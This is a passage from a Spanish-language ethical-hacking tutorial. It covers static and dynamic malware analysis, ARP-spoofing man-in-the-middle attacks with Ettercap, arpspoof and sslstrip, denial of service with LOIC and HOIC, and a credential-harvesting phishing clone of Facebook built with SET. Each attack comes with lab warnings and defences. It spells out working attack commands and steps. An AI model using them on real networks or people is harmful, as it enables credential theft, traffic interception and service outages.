| **Gusano**     | Se propaga por la red sin ayuda de un archivo anfitri√≥n         | Se env√≠a por correo autom√°ticamente         |
| **Troyano**    | Se disfraza de programa √∫til pero tiene c√≥digo malicioso oculto | Supuesto instalador de juegos, pero roba    |
| **Ransomware** | Cifra archivos y exige dinero para recuperarlos                 | Cifra tus documentos y pide pago en Bitcoin |
| **Spyware**    | Esp√≠a al usuario sin que lo sepa                                | Registra tus teclas (keylogger)             |
| **Adware**     | Muestra anuncios no deseados                                    | Abre ventanas emergentes sin parar          |
| **Rootkits**   | Ocultan su presencia para evitar ser detectados por antivirus   | Se instalan en el sistema operativo         |

---

### üß™ ¬øQu√© es el AN√ÅLISIS EST√ÅTICO DE MALWARE?

Es una t√©cnica para analizar un archivo malicioso **sin ejecutarlo**, examinando su estructura, c√≥digo y comportamiento **de forma segura**.

---

#### üéØ ¬øPara qu√© sirve?

- Entender qu√© hace el malware
- Saber si es peligroso
- Ver si roba informaci√≥n, se propaga, o encripta archivos
- Identificar indicadores de compromiso (IoCs)

---

### üîç Herramientas para an√°lisis est√°tico

Aqu√≠ algunas herramientas muy √∫tiles:

| Herramienta              | Funci√≥n principal                               |
| ------------------------ | ----------------------------------------------- |
| **VirusTotal**           | Subir archivo y ver qu√© antivirus lo detectan   |
| **Strings**              | Extraer texto del archivo                       |
| **PEStudio**             | Analizar archivos ejecutables (.exe) en Windows |
| **BinText**              | Ver texto legible dentro del ejecutable         |
| **Detect It Easy (DIE)** | Identifica si est√° ofuscado o empaquetado       |
| **Ghidra**               | Ingenier√≠a inversa (decompilador)               |

---

### üõ†Ô∏è ¬øC√≥mo instalar un entorno seguro para analizar malware?

Lo mejor es hacerlo **en una m√°quina virtual aislada** (sandbox). Aqu√≠ van los pasos:

---

#### üß± PASO 1: Crear una m√°quina virtual segura

Puedes usar **VirtualBox** o **VMware**:

- Instala **VirtualBox** en tu PC
- Descarga una **ISO de Windows 10** desde Microsoft (modo evaluaci√≥n)
- Crea una m√°quina virtual de **Windows 10 sin conexi√≥n a internet**

üí° _Opcional: Puedes usar Kali Linux si prefieres herramientas en Linux, pero la mayor√≠a de malware apunta a Windows._

---

#### üîê PASO 2: Desactiva internet en la VM

Para evitar propagaci√≥n o filtraci√≥n, **nunca tengas la VM con malware conectada a Internet.**

En VirtualBox:

1. Ve a **Configuraci√≥n > Red**
2. Selecciona **"No conectado"**

---

#### üß∞ PASO 3: Instala herramientas dentro de la VM

Instala estas herramientas de an√°lisis (desc√°rgalas primero desde tu PC anfitri√≥n y transfi√©relas por carpeta compartida):

- [DIE (Detect It Easy)](https://ntinfo.biz/)
- [Strings (Sysinternals)](https://learn.microsoft.com/en-us/sysinternals/downloads/strings)
- [BinText](https://www.mcafee.com/enterprise/en-us/downloads/free-tools/bintext.html)
- [PEStudio](https://www.winitor.com/)
- [Ghidra (opcional)](https://ghidra-sre.org/)

---

### ‚úÖ EJEMPLO COMPLETO: An√°lisis est√°tico paso a paso

Sup√≥n que tienes un archivo llamado `sospechoso.exe`. Vamos a hacer un an√°lisis est√°tico **sin ejecutarlo**.

---

#### üîé PASO 1: Examinar con Strings

Usamos Strings para ver si hay textos legibles:

```bash
strings sospechoso.exe > salida.txt
```

üìå Resultado: encuentras cosas como:

```
http://malicioso.com/puerta
C:\Users\Admin\secreto.txt
cmd.exe /c del archivo
```

üß† **Interpretaci√≥n**: El archivo hace llamadas a Internet y ejecuta comandos.

---

#### üß™ PASO 2: Usar PEStudio

Abre `sospechoso.exe` con PEStudio:

- PEStudio te muestra:

  - Permisos solicitados
  - Importaciones de funciones como `CreateRemoteThread`, `LoadLibrary`, etc.
  - Si est√° empaquetado con UPX u otros m√©todos

---

#### üîê PASO 3: Comprobar en VirusTotal (solo si es seguro)

Desde tu PC anfitri√≥n (no la VM), sube el archivo a:

üëâ [https://virustotal.com](https://virustotal.com)

üìå Resultado:

- 43 de 70 antivirus lo detectan como "Trojan.Generic" o similar

---

#### üî© PASO 4: Ver si est√° ofuscado (DIE)

Abres `sospechoso.exe` en DIE.

Resultado:

- Detecta que est√° comprimido con UPX.

‚úÖ Esto indica que el archivo est√° empaquetado para ocultar su verdadero c√≥digo.

---

### üõ°Ô∏è RECOMENDACIONES DE SEGURIDAD

- Siempre analiza dentro de una **m√°quina virtual aislada**
- No abras el malware en tu PC personal
- No lo conectes a internet
- Toma **snapshots** antes de empezar por si algo falla
- Desactiva antivirus de la VM (pueden borrar el malware sin que analices)

---

### üß† CONCLUSI√ìN

| Concepto                  | Explicaci√≥n f√°cil                                          |
| ------------------------- | ---------------------------------------------------------- |
| **Malware**               | Software malicioso que da√±a o roba informaci√≥n             |
| **An√°lisis est√°tico**     | Examinar malware sin ejecutarlo                            |
| **Herramientas clave**    | Strings, PEStudio, DIE, VirusTotal, Ghidra                 |
| **Entorno seguro**        | M√°quina virtual sin internet, con herramientas             |
| **Resultado del ejemplo** | Se detect√≥ que `sospechoso.exe` era un troyano empaquetado |

---

[üîº](#√≠ndice)

---

## **884. Malware y An√°lisis din√°mico de malware**

### ü¶† ¬øQu√© es el MALWARE?

**Malware** = ‚ÄúMalicious Software‚Äù (software malicioso). Es cualquier programa o c√≥digo que tiene como intenci√≥n **da√±ar, infectar, robar, espiar o interrumpir** el sistema de un usuario sin su consentimiento.

---

#### üî• Tipos comunes de malware (con ejemplos):

| Tipo       | ¬øQu√© hace?                                           | Ejemplo simple                        |
| ---------- | ---------------------------------------------------- | ------------------------------------- |
| Virus      | Infecta archivos para propagarse                     | Infecta Word.exe y se propaga         |
| Troyano    | Se oculta como algo √∫til pero tiene c√≥digo malicioso | "Crack de juego" que roba contrase√±as |
| Ransomware | Cifra archivos y pide dinero para recuperarlos       | Bloquea tus fotos y pide bitcoins     |
| Gusano     | Se propaga por red sin intervenci√≥n humana           | Se copia por correo sin permiso       |
| Keylogger  | Graba lo que escribes (contrase√±as, chats, etc.)     | Envia tus claves por correo           |

---

### üß™ ¬øQu√© es el AN√ÅLISIS DIN√ÅMICO de MALWARE?

Es una t√©cnica que **ejecuta el malware en un entorno controlado** (sandbox o laboratorio virtual) para observar su **comportamiento en tiempo real**.

---

#### üéØ ¬øPara qu√© sirve?

- Ver qu√© archivos modifica o crea
- Qu√© procesos inicia
- A qu√© direcciones se conecta
- Qu√© claves del registro cambia
- Si crea persistencia en el sistema
- Qu√© se descarga o qu√© roba

---

### üõ†Ô∏è ¬øC√≥mo se hace de forma segura?

#### ‚ö†Ô∏è Importante: **NUNCA** ejecutes malware en tu computadora normal. Siempre usa una **m√°quina virtual sin internet ni antivirus.**

---

### üß∞ Herramientas para an√°lisis din√°mico:

| Herramienta                | ¬øPara qu√© sirve?                                |
| -------------------------- | ----------------------------------------------- |
| **Procmon** (Sysinternals) | Ver archivos, procesos y claves modificadas     |
| **Process Explorer**       | Ver procesos en ejecuci√≥n                       |
| **Wireshark**              | Capturar tr√°fico de red                         |
| **Autoruns**               | Ver persistencia autom√°tica (inicio de Windows) |
| **Regshot**                | Comparar cambios en el registro                 |
| **FakeNet-NG**             | Simula servidores de red para ver tr√°fico       |
| **INetSim**                | Emula servicios de red (DNS, HTTP, FTP, etc.)   |
| **Any.Run / FLARE-VM**     | Entornos especializados (m√°s avanzados)         |

---

### üñ•Ô∏è C√≥mo instalar un entorno de an√°lisis din√°mico (modo laboratorio seguro)

#### üß± Paso 1: Instalar una m√°quina virtual

Puedes usar:

- [VirtualBox (gratis)](https://www.virtualbox.org/)
- [VMware Workstation Player (gratis)](https://www.vmware.com/)

Usaremos una m√°quina virtual con **Windows 10** (ideal porque muchos malware est√°n hechos para Windows).

üí° **Descarga oficial Windows ISO** (modo evaluaci√≥n):

üëâ [https://www.microsoft.com/en-us/software-download/windows10](https://www.microsoft.com/en-us/software-download/windows10)

---

#### üõë Paso 2: Aislar la m√°quina virtual

En VirtualBox:

- Configura **Red > No Conectado**
- Desactiva carpetas compartidas y portapapeles bidireccionales

---

#### üì¶ Paso 3: Instala herramientas dentro de la VM

Desde tu PC real (anfitri√≥n), descarga las herramientas y p√°salas por una carpeta compartida (¬°no conectes la VM a internet!).

##### Herramientas clave:

1. **Process Monitor (Procmon)** ‚Äì ver actividad de disco y registro
2. **Process Explorer** ‚Äì para ver procesos activos
3. **Regshot** ‚Äì tomar capturas del registro antes y despu√©s
4. **Wireshark** ‚Äì capturar tr√°fico (opcional si simulas red)
5. **Autoruns** ‚Äì ver programas que se ejecutan al iniciar
6. **FakeNet-NG** o **INetSim** ‚Äì para simular servidores (avanzado)

---

### ‚úÖ EJEMPLO COMPLETO: An√°lisis din√°mico paso a paso

Supongamos que tienes un archivo sospechoso llamado `malicioso.exe`.

---

#### üîç Paso 1: Prepara entorno

1. **Toma snapshot** de la m√°quina virtual.
2. Abre **Regshot**, toma una primera foto del registro.
3. Abre **Procmon** (filtra solo eventos relacionados con el ejecutable).
4. Abre **Process Explorer**.

---

#### ‚ñ∂Ô∏è Paso 2: Ejecuta el malware

- Haz doble clic en `malicioso.exe`
- Observa en **Procmon**:

  - Archivos que crea (ej: `C:\Users\Admin\AppData\temp\xyz.exe`)
  - Cambios en el registro (ej: claves de inicio autom√°tico)

- Observa en **Process Explorer**:

  - Procesos hijos creados
  - Si se inyecta en otro proceso (sospechoso)

---

#### üïµÔ∏è Paso 3: Captura del tr√°fico de red (opcional)

- Abre **Wireshark** o FakeNet-NG
- Observa si intenta conectarse a:

  - IPs externas (ej: `185.192.80.2`)
  - URLs (ej: `http://stealinfo.ru`)

---

#### üßæ Paso 4: Comparaci√≥n de cambios

- En **Regshot**, toma una segunda foto del registro
- Compara:

  - ¬øSe agreg√≥ algo a `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`?
    ‚Üí Esto indica persistencia

---

#### üìå Resultado del an√°lisis:

**Resumen:**

- `malicioso.exe` crea otro archivo oculto
- Modifica el registro para ejecutarse al iniciar Windows
- Intenta conectarse a `http://123.45.67.89/bot.php`
- Se inyecta en `explorer.exe`

**Conclusi√≥n:** Es un troyano que se instala, persiste y se conecta con un servidor externo ‚Üí POSIBLE botnet o robo de informaci√≥n.

---

### üß† CONSEJOS FINALES:

| Seguridad                       | Recomendaci√≥n                                                                                             |
| ------------------------------- | --------------------------------------------------------------------------------------------------------- |
| M√°quina virtual sin internet    | Nunca conectes el malware a internet real                                                                 |
| Snapshot antes de empezar       | Para poder volver al estado original                                                                      |
| No abras malware fuera de la VM | Ni en tu celular, ni en tu PC real                                                                        |
| Usa malware de prueba legal     | Como EICAR o muestras en sitios como [malware-traffic-analysis.net](http://malware-traffic-analysis.net/) |

---

### üìö ¬øD√≥nde practicar legalmente?

- [https://malware-traffic-analysis.net/](https://malware-traffic-analysis.net/)
- [https://thezoo.morirt.com/](https://thezoo.morirt.com/) _(cuidado, usar solo en VM aisladas)_
- [https://any.run](https://any.run) _(sandbox online gratuito con an√°lisis din√°mico en tiempo real)_

---

[üîº](#√≠ndice)

---

## **885. Sniffing y C√≥mo realizar un ataque Man in the middle automatico**

### üïµÔ∏è‚Äç‚ôÇÔ∏è ¬øQu√© es Sniffing?

**Sniffing** es el proceso de **capturar y analizar el tr√°fico de red** que pasa por una interfaz de red.

#### üéØ Objetivo:

Ver qu√© informaci√≥n viaja por la red, como:

- Usuarios y contrase√±as
- Cookies de sesi√≥n
- Sitios visitados
- Archivos descargados

---

#### üì¶ Tipos de sniffing:

| Tipo       | ¬øQu√© hace?                                                                  |
| ---------- | --------------------------------------------------------------------------- |
| **Pasivo** | Solo escucha el tr√°fico que pasa, sin interferir (como un esp√≠a silencioso) |
| **Activo** | Interfiere para redirigir o manipular tr√°fico (como en MITM)                |

---

### ü¶π ¬øQu√© es un ataque **Man-in-the-Middle (MITM)?**

Es un ataque donde el atacante se **interpone entre dos partes que se comunican**, como un router y un usuario.

**Ejemplo simple:**

Imagina que Alice quiere hablar con Bob, pero Eve (el atacante) se mete en medio:

```
Alice --> [Eve (atacante)] --> Bob
```

Alice cree que est√° hablando con Bob, y Bob cree que est√° hablando con Alice. Pero **Eve ve todo** y puede incluso **modificar los mensajes**.

---

### üîß ¬øQu√© necesito para practicar?

Usaremos un **entorno seguro de laboratorio con Kali Linux**. No lo hagas en redes reales sin permiso.

#### ‚úÖ Herramientas necesarias (todas vienen en Kali Linux):

- **Ettercap**: para ataques MITM autom√°ticos
- **Wireshark**: para ver el tr√°fico capturado
- **arpspoof** (opcional)
- **iptables** (para redireccionar tr√°fico)
- **sslstrip** (para bajar HTTPS a HTTP)

---

### üñ•Ô∏è PASO A PASO: C√≥mo instalar el entorno (si no tienes Kali)

1. **Descargar Kali Linux** desde su web oficial:

   üëâ [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

2. **Inst√°lalo en una m√°quina virtual (VirtualBox o VMware)**
   Configura red en modo ‚Äúred interna‚Äù o ‚Äúbridge‚Äù para que tu Kali pueda interactuar con otras m√°quinas virtuales (como una v√≠ctima con Windows).

---

### üéØ ESCENARIO DE PRUEBA

- Kali Linux = atacante
- M√°quina v√≠ctima = Windows 10 (puedes crear otra VM con Windows)

---

### üî• PR√ÅCTICA COMPLETA: Ataque MITM autom√°tico con Ettercap

---

#### üõ† Paso 1: Configura la red

En VirtualBox:

- Ambos (Kali y Windows) deben estar en **red interna** o **modo puente**.

Verifica que Kali pueda hacer ping a la v√≠ctima.

```bash
ping 192.168.1.5  # IP de la v√≠ctima
```

---

#### üõ† Paso 2: Activar IP forwarding en Kali

Esto permite que Kali reenv√≠e tr√°fico para que la v√≠ctima no sospeche.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

#### üõ† Paso 3: Ejecutar Ettercap

Abre Ettercap en modo gr√°fico:

```bash
ettercap -G
```

Pasos en la interfaz gr√°fica:

1. Ir a **Sniff ‚Üí Unified sniffing**
2. Selecciona la interfaz de red (ej. `eth0` o `enp0s3`)
3. Ve a **Hosts ‚Üí Scan for hosts**
4. Luego a **Hosts ‚Üí Host list**

   - Selecciona la IP del **router/gateway** y haz clic en ‚ÄúAdd to Target 1‚Äù
   - Selecciona la IP de la **v√≠ctima** y haz clic en ‚ÄúAdd to Target 2‚Äù

5. Ve a **Mitm ‚Üí ARP poisoning**

   - Marca ‚ÄúSniff remote connections‚Äù

6. Finalmente ve a **Start ‚Üí Start sniffing**

---

#### üïµÔ∏è Paso 4: Captura con Wireshark

Abre Wireshark en Kali y selecciona la misma interfaz (ej. `eth0`) para empezar a ver los paquetes.

Filtra por protocolos interesantes:

```bash
http
ftp
telnet
```

---

#### üéÅ EJEMPLO REAL: Captura de contrase√±as HTTP

1. La v√≠ctima entra a una web con login no cifrado (ej. [http://testphp.vulnweb.com/login.php](http://testphp.vulnweb.com/login.php))
2. Kali intercepta y ve:

```
POST /login.php HTTP/1.1
username=admin&password=1234
```

üéâ ¬°Contrase√±a capturada!

---

### ‚ö†Ô∏è ¬øC√≥mo funciona t√©cnicamente el ataque?

Usamos **ARP poisoning**, que consiste en enviar respuestas falsas de ARP para enga√±ar a los dispositivos de la red.

> El atacante dice: ‚Äú¬°Hola! Yo soy el router‚Äù al usuario
> Y al router le dice: ‚Äú¬°Hola! Yo soy el usuario‚Äù

Esto redirige el tr√°fico a trav√©s del atacante.

---

### üõ° ¬øC√≥mo protegerse?

| Medida de protecci√≥n      | ¬øC√≥mo ayuda?                                      |
| ------------------------- | ------------------------------------------------- |
| HTTPS en todas las webs   | Evita ver contenido √∫til al sniffing              |
| Red segmentada            | Dificulta el MITM en redes p√∫blicas               |
| IP/MAC est√°tica           | Reduce riesgo de ARP spoofing                     |
| VPN                       | Cifra todo el tr√°fico, incluso en redes inseguras |
| Detecci√≥n de ARP spoofing | Herramientas como `arpwatch`, `XArp`              |

---

### üß† Conclusi√≥n

- **Sniffing** permite capturar tr√°fico de red.
- **Ataques MITM** son una forma activa de interceptar comunicaciones.
- Con herramientas como **Ettercap** puedes automatizar el proceso f√°cilmente.
- Solo pract√≠calo en entornos **controlados y legales**.

---

[üîº](#√≠ndice)

---

## **886. Sniffing y C√≥mo realizar un ataque Man in the middle manual**

### üß† ¬øQu√© es Sniffing?

**Sniffing** significa **‚Äúhusmear‚Äù el tr√°fico de red**. Consiste en capturar los paquetes de datos que viajan entre dispositivos.
Un sniffer permite al atacante ver lo que los usuarios est√°n haciendo en la red: contrase√±as, mensajes, sitios web visitados, etc.

---

### üé≠ ¬øQu√© es un Ataque Man-In-The-Middle (MITM)?

Un **MITM** es cuando un atacante se **interpone entre dos dispositivos que se comunican**, como un router y una v√≠ctima, sin que ellos lo noten.
El atacante intercepta, registra o incluso modifica esa informaci√≥n.

**Ejemplo gr√°fico:**

```
[V√≠ctima] ‚ÜîÔ∏è [Atacante] ‚ÜîÔ∏è [Router]
```

---

### üõ†Ô∏è Herramientas necesarias para el MITM manual:

Vamos a usar:

| Herramienta             | Uso                                             |
| ----------------------- | ----------------------------------------------- |
| `arpspoof`              | Para enga√±ar a los dispositivos con ARP         |
| `tcpdump` o `wireshark` | Para capturar paquetes                          |
| `iptables`              | Para redireccionar tr√°fico (si analizamos HTTP) |
| `sslstrip`              | (Opcional) Para bajar HTTPS a HTTP              |

---

### üîß PASO A PASO: Preparaci√≥n del entorno

#### üì• Paso 1: Instalar Kali Linux (si no lo tienes)

1. Descarga Kali desde: [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
2. Inst√°lalo en VirtualBox o VMware.
3. Configura la red en modo **Bridge** o **Red interna** (con otra VM v√≠ctima, por ejemplo con Windows o Ubuntu).

---

#### üì° Paso 2: Verifica conectividad

Verifica que puedes hacer ping desde Kali hacia la v√≠ctima:

```bash
ping 192.168.1.5  # IP de la v√≠ctima
```

---

### üî• MANUAL MITM: Ejemplo completo paso a paso

#### üß™ ESCENARIO:

- Kali Linux = atacante
- Windows 10 = v√≠ctima
- Ambos est√°n en la misma red local

---

#### üî¢ Paso 1: Descubre la IP de la v√≠ctima

```bash
netdiscover -r 192.168.1.0/24
```

O usa:

```bash
arp-scan -l
```

Anota:

- IP de la v√≠ctima: `192.168.1.5`
- IP del gateway/router: `192.168.1.1`

---

#### üß∞ Paso 2: Activa el reenv√≠o de paquetes (IP forwarding)

Esto es para que la v√≠ctima no pierda conexi√≥n cuando el tr√°fico pase por Kali.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

#### üß® Paso 3: Ejecuta ARP Spoofing manual

Con `arpspoof`, Kali se hace pasar por el router frente a la v√≠ctima y viceversa.

1. Terminal 1 (suplantar el router ante la v√≠ctima):

```bash
arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
```

2. Terminal 2 (suplantar la v√≠ctima ante el router):

```bash
arpspoof -i eth0 -t 192.168.1.1 192.168.1.5
```

> Aseg√∫rate de que `eth0` es tu interfaz (verif√≠calo con `ip a`).

---

#### üïµÔ∏è Paso 4: Captura el tr√°fico con Wireshark o tcpdump

Ejemplo con `tcpdump`:

```bash
tcpdump -i eth0 -w mitm-captura.pcap
```

O Wireshark:

```bash
wireshark &
```

Filtra por `http`, `ftp`, `telnet` para ver credenciales f√°cilmente.

---

#### üåê Paso 5: Victima navega por sitios HTTP (no HTTPS)

P√≠dele (o simula) que acceda a una web con login vulnerable:

```http
http://testphp.vulnweb.com/login.php
```

Wireshark mostrar√° algo como:

```
POST /login.php HTTP/1.1
Host: testphp.vulnweb.com
username=admin&password=123456
```

üéâ ¬°Datos interceptados!

---

### üîí ¬øY si el sitio usa HTTPS?

Aqu√≠ es donde **sslstrip** entra:

1. Redirige tr√°fico a puerto 10000:

```bash
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```

2. Ejecuta sslstrip:

```bash
sslstrip -l 10000
```

Esto convierte conexiones HTTPS en HTTP (cuando es posible), para ver los datos sin cifrado.

---

### ‚úÖ ¬øC√≥mo revertir el ataque?

1. Det√©n los procesos `arpspoof`, `sslstrip`, etc.
2. Desactiva el IP forwarding:

```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```

3. Limpia iptables:

```bash
iptables -F
iptables -t nat -F
```

---

### üß† RESUMEN DEL FLUJO:

1. Kali enga√±a a v√≠ctima y router con `arpspoof`
2. Redirige tr√°fico si quieres usar `sslstrip`
3. Captura tr√°fico con `tcpdump` o `Wireshark`
4. Observa credenciales y otros datos en sitios HTTP

---

### üìå CONSEJO

Este ataque puede ser detectado por IDS/IPS modernos o herramientas como `arpwatch` o `XArp`. Tambi√©n falla en redes con protecci√≥n ARP o tr√°fico encriptado por VPN.

---

[üîº](#√≠ndice)

---

## **887. Denegaci√≥n de servicio. Ataque DOS con LOIC y HOIC**

### üß† ¬øQu√© es un Ataque de Denegaci√≥n de Servicio (DoS)?

Un ataque **DoS (Denial of Service)** busca **inutilizar un sistema, servidor o red**, haciendo que no pueda responder a usuarios leg√≠timos. Esto se logra **inundando el servidor con tr√°fico basura** o **consumiendo todos sus recursos**.

> Imag√≠nate una pizzer√≠a que solo tiene una l√≠nea telef√≥nica y alguien llama sin parar para que los clientes reales no puedan pedir.

---

#### üß® Diferencia entre DoS y DDoS

| Tipo     | Descripci√≥n                                           |
| -------- | ----------------------------------------------------- |
| **DoS**  | Un solo atacante lanza el ataque.                     |
| **DDoS** | Ataque distribuido desde m√∫ltiples equipos (botnets). |

---

### üõ†Ô∏è Herramientas: LOIC y HOIC

#### 1. **LOIC (Low Orbit Ion Cannon)**

- Herramienta para realizar ataques DoS/DDoS.
- Interfaz gr√°fica.
- Se puede controlar remotamente por IRC.

#### 2. **HOIC (High Orbit Ion Cannon)**

- M√°s avanzado que LOIC.
- Permite usar ‚Äúbooster scripts‚Äù.
- Env√≠o de tr√°fico HTTP simulado m√°s complejo.

---

### üîß Instalaci√≥n de LOIC y HOIC

> ‚ö†Ô∏è Usa m√°quinas virtuales y laboratorios locales. Nunca ataques sitios reales.

#### üñ•Ô∏è Requisitos:

- Windows o Kali Linux (con Wine)
- Java (para HOIC)
- Entorno de laboratorio con un servidor web (por ejemplo, XAMPP)

---

#### üíª Instalar LOIC en Windows:

1. Descarga desde un mirror confiable como:
   [https://github.com/NewEraCracker/LOIC](https://github.com/NewEraCracker/LOIC)

2. Extrae el archivo `.zip`.

3. Ejecuta `LOIC.exe`.

---

#### üíª Instalar HOIC en Windows:

1. Descarga desde:
   [https://sourceforge.net/projects/high-orbit-ion-cannon/](https://sourceforge.net/projects/high-orbit-ion-cannon/)

2. Descomprime y ejecuta `HOIC.exe`.

> Si no abre, aseg√∫rate de tener **.NET Framework** y **Java** instalados.

---

#### üêß ¬øY en Kali Linux?

Ambas pueden correr usando **Wine**:

```bash
sudo apt update && sudo apt install wine
```

Luego:

```bash
wine LOIC.exe
wine HOIC.exe
```

---

### üß™ EJEMPLO COMPLETO DE ATAQUE DoS EN LABORATORIO

#### üìò Escenario:

- Servidor web local usando **XAMPP**
- Kali Linux o Windows con LOIC
- Ataque desde LOIC a `http://localhost` o `192.168.1.10`

---

#### üõ†Ô∏è Paso 1: Configura tu servidor web

En una VM Windows o Kali:

1. Instala XAMPP:
   [https://www.apachefriends.org/es/index.html](https://www.apachefriends.org/es/index.html)

2. Inicia **Apache** y abre en navegador:

   ```
   http://localhost
   ```

---

#### üöÄ Paso 2: Ejecuta LOIC

1. Abre LOIC.
2. En el campo ‚Äú**IP or URL**‚Äù, escribe la IP de tu servidor (por ejemplo `192.168.1.10`).
3. Marca la opci√≥n: **"I'm a CHARGING my laser"**.
4. Haz clic en "**FIRE!**".

---

#### üî• Resultado esperado

- El servidor empieza a recibir muchas peticiones por segundo.
- Si no est√° bien configurado o es d√©bil, **el sitio se cuelga o se vuelve lento**.

---

#### üß™ ¬øY HOIC?

1. Abre HOIC.
2. Haz clic en ‚Äú+ Add Target‚Äù.
3. Agrega la URL del servidor.
4. En ‚ÄúPower‚Äù selecciona: `HIGH`.
5. Agrega un ‚ÄúBooster‚Äù (opcional).
6. Haz clic en ‚ÄúFIRE TEH LAZER!‚Äù.

HOIC simula tr√°fico web m√°s realista que LOIC.

---

### üìä Comparaci√≥n LOIC vs HOIC

| Herramienta | Ventajas                  | Desventajas                          |
| ----------- | ------------------------- | ------------------------------------ |
| **LOIC**    | F√°cil, r√°pido, visible    | Detectable f√°cilmente, sin camuflaje |
| **HOIC**    | M√°s realista, usa scripts | Requiere configuraci√≥n extra, Java   |

---

### üõ°Ô∏è ¬øC√≥mo protegerse de ataques DoS?

- Usar firewalls con protecci√≥n contra DoS.
- Configurar l√≠mites de conexi√≥n en el servidor.
- Usar servicios anti-DDoS como Cloudflare.
- Monitorear el tr√°fico en tiempo real.

---

### üìå CONCLUSI√ìN

- LOIC y HOIC son herramientas educativas que muestran c√≥mo funciona un DoS.
- Nunca deben usarse fuera de laboratorios.
- Ayudan a entender c√≥mo defender redes reales.

---

[üîº](#√≠ndice)

---

## **888. Ingenier√≠a social**

### üß† ¬øQu√© es la Ingenier√≠a Social?

La **ingenier√≠a social** es el arte de **manipular psicol√≥gicamente a una persona** para que **revele informaci√≥n confidencial**, **entregue acceso** o **realice una acci√≥n** que compromete la seguridad.

> üîê No se ataca la tecnolog√≠a, sino al **eslab√≥n m√°s d√©bil: el humano**.

---

### üéØ Ejemplos comunes:

| Tipo de Ataque | Descripci√≥n                                             | Ejemplo                                                              |
| -------------- | ------------------------------------------------------- | -------------------------------------------------------------------- |
| **Phishing**   | Env√≠o de correos falsos que imitan a empresas reales.   | Un correo de ‚Äútu banco‚Äù que te pide ingresar tus credenciales.       |
| **Vishing**    | Llamadas telef√≥nicas fraudulentas.                      | Alguien llama diciendo ser de soporte t√©cnico para obtener tu clave. |
| **Smishing**   | Phishing v√≠a SMS.                                       | Mensaje diciendo que ganaste un premio y debes hacer clic.           |
| **Baiting**    | Ofrecer algo tentador para enga√±ar.                     | Dejar una USB infectada en una oficina con el nombre ‚ÄúN√≥mina 2025‚Äù.  |
| **Pretexting** | Inventar una historia falsa para conseguir informaci√≥n. | Fingir ser del √°rea de RRHH pidiendo datos personales.               |

---

### üõ†Ô∏è ¬øC√≥mo se instala un entorno de pr√°ctica?

Para aprender ingenier√≠a social de forma √©tica, puedes **crear un laboratorio con Kali Linux** y herramientas como **SET (Social-Engineer Toolkit)**.

---

### üêß Instalaci√≥n del entorno: Kali Linux + SET

#### üì¶ Paso 1: Instalar Kali Linux

Tienes dos opciones:

##### ‚úÖ Opci√≥n A: M√°quina virtual

1. Instala **VirtualBox**:
   üëâ [https://www.virtualbox.org](https://www.virtualbox.org)
2. Descarga imagen de Kali:
   üëâ [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines)
3. Importa el `.ova` en VirtualBox.

##### ‚úÖ Opci√≥n B: USB booteable

1. Usa **Rufus** para crear un USB con la ISO de Kali.
2. Bootea desde el USB para usar Kali en vivo.

---

#### üîß Paso 2: Verifica que SET est√© instalado

Kali Linux ya incluye **SET**.

Para abrirlo:

```bash
sudo setoolkit
```

Si no est√°, inst√°lalo con:

```bash
sudo apt update
sudo apt install set
```

---

### üß™ EJEMPLO COMPLETO: Ataque de Phishing Simulado con SET

> ‚ö†Ô∏è Solo en un laboratorio, **NO lo hagas en redes reales ni con v√≠ctimas reales.**

#### üéØ Objetivo del ataque:

Clonar la p√°gina de inicio de sesi√≥n de **Facebook** y recolectar credenciales simuladas en red local.

---

#### ü™ú Paso a paso:

##### 1. Abrir SET

```bash
sudo setoolkit
```

##### 2. Men√∫ principal de SET

Selecciona las opciones:

```
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
```

##### 3. Ingresar la IP del atacante

Kali te pedir√°:

```
Enter the IP address to which the data will be sent:
```

Escribe tu IP local. Ejemplo:

```
192.168.1.5
```

##### 4. Ingresar el sitio a clonar

Ejemplo:

```
https://facebook.com
```

##### 5. Resultado

SET clona el sitio y levanta un servidor en tu Kali.

Pide a tu v√≠ctima (otro equipo en tu red local) que visite:

```
http://192.168.1.5
```

Cuando ingresen usuario y contrase√±a, esos datos se guardar√°n en un archivo:

```bash
/root/.set/reports/harvester/
```

---

#### üí° Simulaci√≥n segura

Para practicar sin afectar a nadie:

- Usa dos m√°quinas virtuales (una como atacante, otra como v√≠ctima).
- Red local (modo puente o red interna).
- No accedas a servicios reales. Solo simula.

---

### üõ°Ô∏è ¬øC√≥mo protegerse de la ingenier√≠a social?

| Defensa                               | Ejemplo                                                         |
| ------------------------------------- | --------------------------------------------------------------- |
| **Concientizaci√≥n**                   | Entrenamientos de phishing en empresas.                         |
| **Doble factor (2FA)**                | Aunque obtengan tu contrase√±a, no pueden entrar sin tu celular. |
| **Verificar siempre el remitente**    | No hacer clic en correos sospechosos.                           |
| **No abrir archivos o USBs extra√±os** | Desconfiar de dispositivos encontrados.                         |

---

### üß© Conclusi√≥n

- La ingenier√≠a social **explota emociones humanas** como la urgencia, el miedo o la curiosidad.
- SET es una herramienta poderosa para entender c√≥mo funcionan los ataques.
- Practica siempre en entornos seguros y √©ticos.

---

[üîº](#√≠ndice)

---

## **889. Pol√≠ticas de seguridad. Seguridad f√≠sica y Controles de acceso**

### üìå 1. ¬øQu√© son las Pol√≠ticas de Seguridad?

Las **pol√≠ticas de seguridad** son **reglas escritas** que definen **c√≥mo proteger los activos de una organizaci√≥n**. Estas reglas establecen lo que **se permite**, lo que **se proh√≠be** y c√≥mo se **responde** a incidentes.

#### üß† Ejemplo f√°cil:

Imagina que trabajas en un colegio y hay una regla que dice:
**"Nadie puede entrar al laboratorio sin identificaci√≥n y sin registrarse."**
üëâ Eso es una pol√≠tica de seguridad **f√≠sica y de acceso.**

---

### üìå 2. Tipos de pol√≠ticas (simples y claras)

| Tipo de pol√≠tica                       | ¬øQu√© protege?                    | Ejemplo sencillo                                 |
